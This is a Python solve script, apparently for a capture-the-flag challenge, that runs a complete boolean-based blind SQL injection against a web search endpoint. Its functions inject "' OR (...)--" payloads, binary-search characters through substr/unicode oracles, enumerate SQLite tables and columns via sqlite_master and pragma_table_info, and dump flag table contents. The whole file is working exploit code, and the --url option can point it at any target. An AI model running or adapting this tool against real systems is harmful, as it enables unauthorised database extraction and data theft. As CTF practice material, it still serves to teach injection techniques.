#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""APEX 待加强名单 —— 布尔盲注提取（SQLite）。

用法：python solve.py [--url URL] [--step info|dump]
"""
import argparse
import sys
import time
import urllib.parse
import urllib.request

B = 'http://wjybu0ms2692nxtr.neu-nex.fun'
UA = 'exp/1.0 (+authorized-ctf)'


def oracle(cond, base=B):
    payload = f"x' OR ({cond})--"
    u = base.rstrip('/') + '/search?name=' + urllib.parse.quote(payload)
    req = urllib.request.Request(u, headers={'User-Agent': UA})
    with urllib.request.urlopen(req, timeout=15) as r:
        return r.read().strip() == b'found'


def ascii_at(expr, pos, base=B):
    """返回 expr 第 pos 个字符的 ASCII（二分）。"""
    lo, hi = 1, 127
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"unicode(substr(({expr}),{pos},1))>{mid}", base):
            lo = mid + 1
        else:
            hi = mid
    return lo


def get_str(expr, maxlen=80, base=B):
    out = []
    for i in range(1, maxlen + 1):
        c = ascii_at(expr, i, base)
        if c == 0:
            break
        out.append(chr(c))
        print(f'    {expr[:40]}... [{i}] -> {chr(c)!r}  ({("".join(out))!r})', flush=True)
    return ''.join(out)


def get_int(expr, base=B):
    lo, hi = 0, 1 << 20
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f'({expr})>{mid}', base):
            lo = mid + 1
        else:
            hi = mid
    return lo


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--url', default=B)
    ap.add_argument('--step', default='info', choices=['info', 'dump'])
    args = ap.parse_args()
    base = args.url

    print('[1] 布尔 oracle 自检')
    t = oracle('1=1', base)
    f = oracle('1=2', base)
    print(f'    1=1 -> {t}, 1=2 -> {f}')
    assert t and not f

    print('[2] 库类型 / 表数量')
    n = get_int("SELECT count(*) FROM sqlite_master WHERE type='table'", base)
    print(f'    表数量 = {n}')

    print('[3] 表名')
    tables = []
    for i in range(n):
        name = get_str(f"SELECT name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET {i}", 40, base)
        tables.append(name)
        print(f'    table[{i}] = {name}')

    print('[4] 各表列名')
    for tname in tables:
        cnt = get_int(f"SELECT count(*) FROM pragma_table_info('{tname}')", base)
        cols = get_str(
            f"SELECT group_concat(name) FROM pragma_table_info('{tname}')", 200, base)
        print(f'    {tname}: {cols}')

    if args.step == 'info':
        return

    print('[5] 尝试取 flag')
    for tname in tables:
        if 'flag' in tname.lower():
            cols = get_str(
                f"SELECT group_concat(name) FROM pragma_table_info('{tname}')", 200, base)
            for col in cols.split(','):
                val = get_str(f"SELECT {col} FROM {tname} LIMIT 1", 80, base)
                print(f'    {tname}.{col} = {val}')
                if 'nex{' in val:
                    print('[+] FLAG:', val)
                    return


if __name__ == '__main__':
    main()
